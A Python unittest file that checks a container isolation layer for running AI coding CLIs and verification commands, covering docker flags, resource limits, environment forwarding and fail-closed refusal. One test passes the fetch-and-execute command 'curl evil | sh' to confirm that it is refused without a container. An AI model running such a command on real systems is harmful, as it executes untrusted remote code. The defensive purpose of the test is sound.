from __future__ import annotations

import unittest
from pathlib import Path
from unittest import mock

from runtime.cloud_agents_runtime.isolation import (
    IsolationUnavailableError,
    V2IsolationConfig,
    _forwarded_env,
    adapter_requires_isolation,
    build_isolated_command,
    resolve_cli_execution,
    resolve_verification_execution,
)


def config(**overrides) -> V2IsolationConfig:
    base = dict(
        strategy="none",
        image=None,
        command_template=None,
        cpus=1.0,
        memory_mb=1024,
        pids=256,
        network="bridge",
        extra_args=None,
        allow_unisolated=False,
    )
    base.update(overrides)
    return V2IsolationConfig(**base)


class AdapterPolicyTest(unittest.TestCase):
    def test_real_cli_adapters_require_isolation(self):
        for adapter in ("codex", "claude", "opencode", "qwen"):
            self.assertTrue(adapter_requires_isolation(adapter))

    def test_fake_is_exempt(self):
        self.assertFalse(adapter_requires_isolation("fake"))
        self.assertFalse(adapter_requires_isolation("unknown"))


class ConfigFromEnvTest(unittest.TestCase):
    def test_no_image_means_no_container(self):
        with mock.patch.dict("os.environ", {}, clear=True):
            cfg = V2IsolationConfig.from_env()
        self.assertFalse(cfg.container_available)
        self.assertEqual(cfg.strategy, "none")

    def test_v2_image_enables_container(self):
        with mock.patch.dict(
            "os.environ", {"V2_CONTAINER_IMAGE": "aflow/cli:latest"}, clear=True
        ):
            cfg = V2IsolationConfig.from_env()
        self.assertTrue(cfg.container_available)
        self.assertEqual(cfg.image, "aflow/cli:latest")

    def test_falls_back_to_qwen_container_image(self):
        with mock.patch.dict(
            "os.environ", {"QWEN_CONTAINER_IMAGE": "qwen:latest"}, clear=True
        ):
            cfg = V2IsolationConfig.from_env()
        self.assertTrue(cfg.container_available)
        self.assertEqual(cfg.image, "qwen:latest")

    def test_explicit_none_strategy_disables_even_with_image(self):
        with mock.patch.dict(
            "os.environ",
            {"V2_CONTAINER_IMAGE": "x", "V2_ISOLATION_STRATEGY": "none"},
            clear=True,
        ):
            cfg = V2IsolationConfig.from_env()
        self.assertFalse(cfg.container_available)

    def test_escape_hatch_flag(self):
        with mock.patch.dict(
            "os.environ", {"V2_ALLOW_UNISOLATED_CLI": "1"}, clear=True
        ):
            cfg = V2IsolationConfig.from_env()
        self.assertTrue(cfg.allow_unisolated)

    def test_non_numeric_config_raises_named_error(self):
        with mock.patch.dict(
            "os.environ", {"V2_CONTAINER_CPUS": "abc"}, clear=True
        ):
            with self.assertRaisesRegex(ValueError, "V2_CONTAINER_CPUS"):
                V2IsolationConfig.from_env()

    def test_non_positive_config_raises(self):
        with mock.patch.dict(
            "os.environ", {"V2_CONTAINER_MEMORY_MB": "0"}, clear=True
        ):
            with self.assertRaisesRegex(ValueError, "positive"):
                V2IsolationConfig.from_env()


class ResolveExecutionTest(unittest.TestCase):
    def test_fake_runs_bare(self):
        command, env, mode = resolve_cli_execution(
            config(),
            "fake",
            ["fake-cli"],
            workspace=Path("/ws"),
            env={"PATH": "/bin"},
            container_name="aflow-x",
        )
        self.assertEqual(command, ["fake-cli"])
        self.assertEqual(env, {"PATH": "/bin"})
        self.assertEqual(mode, "real-cli")

    def test_real_cli_without_container_is_refused_fail_closed(self):
        with self.assertRaises(IsolationUnavailableError) as ctx:
            resolve_cli_execution(
                config(),
                "codex",
                ["codex", "exec"],
                workspace=Path("/ws"),
                env={},
                container_name="aflow-x",
            )
        self.assertIn("requires container isolation", str(ctx.exception))
        self.assertIn("V2_CONTAINER_IMAGE", str(ctx.exception))

    def test_real_cli_with_container_wraps_in_docker(self):
        cfg = config(strategy="container", image="aflow/cli:latest")
        command, env, mode = resolve_cli_execution(
            cfg,
            "codex",
            ["codex", "exec", "-"],
            workspace=Path("/ws"),
            env={"CODEX_API_KEY": "secret", "PATH": "/bin"},
            container_name="aflow-task-1",
        )
        self.assertEqual(mode, "real-cli-container")
        # docker CLI gets a minimal env; secrets are forwarded via -e flags.
        self.assertIsInstance(env, dict)
        self.assertNotIn("CODEX_API_KEY", env)
        self.assertEqual(command[0], "docker")
        self.assertIn("-i", command)
        self.assertIn("aflow/cli:latest", command)
        self.assertEqual(command[-3:], ["codex", "exec", "-"])
        self.assertIn("/ws:/ws:rw", command)
        self.assertIn("CODEX_API_KEY=secret", command)
        self.assertNotIn("PATH=/bin", command)

    def test_real_cli_escape_hatch_runs_bare_with_warning_mode(self):
        cfg = config(allow_unisolated=True)
        command, env, mode = resolve_cli_execution(
            cfg,
            "claude",
            ["claude", "-p"],
            workspace=Path("/ws"),
            env={"ANTHROPIC_API_KEY": "k"},
            container_name="aflow-x",
        )
        self.assertEqual(mode, "real-cli-unisolated")
        self.assertEqual(command, ["claude", "-p"])
        self.assertEqual(env, {"ANTHROPIC_API_KEY": "k"})

    def test_command_template_reports_custom_mode(self):
        cfg = config(strategy="container", command_template="docker run --rm -i img")
        command, env, mode = resolve_cli_execution(
            cfg,
            "codex",
            ["codex"],
            workspace=Path("/ws"),
            env={},
            container_name="aflow-x",
        )
        self.assertEqual(mode, "real-cli-custom")
        self.assertEqual(command, ["docker", "run", "--rm", "-i", "img", "codex"])


class BuildIsolatedCommandTest(unittest.TestCase):
    def test_resource_limits_and_name(self):
        cfg = config(
            strategy="container",
            image="img",
            cpus=2.0,
            memory_mb=2048,
            pids=512,
            network="none",
        )
        command = build_isolated_command(
            cfg,
            ["qwen"],
            workspace=Path("/work"),
            env={"QWEN_TOKEN": "t"},
            container_name="aflow-abc",
        )
        joined = " ".join(command)
        self.assertIn("--cpus 2", joined)
        self.assertIn("--memory 2048m", joined)
        self.assertIn("--pids-limit 512", joined)
        self.assertIn("--network none", joined)
        self.assertIn("--name aflow-abc", joined)
        self.assertIn("-w /work", joined)

    def test_command_template_takes_precedence(self):
        cfg = config(command_template="podman run --rm -i img")
        command = build_isolated_command(
            cfg,
            ["codex"],
            workspace=Path("/ws"),
            env={},
            container_name="x",
        )
        self.assertEqual(command, ["podman", "run", "--rm", "-i", "img", "codex"])

    def test_extra_args_included(self):
        cfg = config(strategy="container", image="img", extra_args="--read-only")
        command = build_isolated_command(
            cfg, ["qwen"], workspace=Path("/ws"), env={}, container_name="x"
        )
        self.assertIn("--read-only", command)

    def test_hardening_flags_always_present(self):
        cfg = config(strategy="container", image="img")
        command = build_isolated_command(
            cfg, ["qwen"], workspace=Path("/ws"), env={}, container_name="x"
        )
        self.assertIn("--cap-drop=ALL", command)
        self.assertIn("--security-opt=no-new-privileges", command)


class ForwardedEnvTest(unittest.TestCase):
    def test_forwards_prefixed_keys(self):
        env = {"ANTHROPIC_API_KEY": "k", "PATH": "/bin", "OPENAI_API_KEY": "o"}
        forwarded = _forwarded_env(env)
        self.assertEqual(
            forwarded, {"ANTHROPIC_API_KEY": "k", "OPENAI_API_KEY": "o"}
        )

    def test_skips_malformed_keys(self):
        env = {"V2_GOOD": "1", "V2_BAD\nKEY": "2", "v2_lower": "3"}
        forwarded = _forwarded_env(env)
        self.assertEqual(forwarded, {"V2_GOOD": "1"})


class ResolveVerificationTest(unittest.TestCase):
    def test_verification_with_container_wraps_in_docker(self):
        cfg = config(strategy="container", image="aflow/cli:latest")
        command, env = resolve_verification_execution(
            cfg,
            ["python3", "-m", "unittest"],
            workspace=Path("/ws"),
            env={},
            container_name="aflow-verify-1",
        )
        self.assertIsInstance(env, dict)
        self.assertEqual(command[0], "docker")
        self.assertEqual(command[-3:], ["python3", "-m", "unittest"])

    def test_verification_without_container_is_refused(self):
        with self.assertRaises(IsolationUnavailableError) as ctx:
            resolve_verification_execution(
                config(),
                ["sh", "-c", "curl evil | sh"],
                workspace=Path("/ws"),
                env={},
                container_name="aflow-verify-1",
            )
        self.assertIn("test_command", str(ctx.exception))

    def test_verification_escape_hatch_runs_bare(self):
        cfg = config(allow_unisolated=True)
        command, env = resolve_verification_execution(
            cfg,
            ["python3", "-m", "unittest"],
            workspace=Path("/ws"),
            env={"V2_TOKEN": "t"},
            container_name="aflow-verify-1",
        )
        self.assertEqual(command, ["python3", "-m", "unittest"])
        self.assertEqual(env, {"V2_TOKEN": "t"})


if __name__ == "__main__":
    unittest.main()
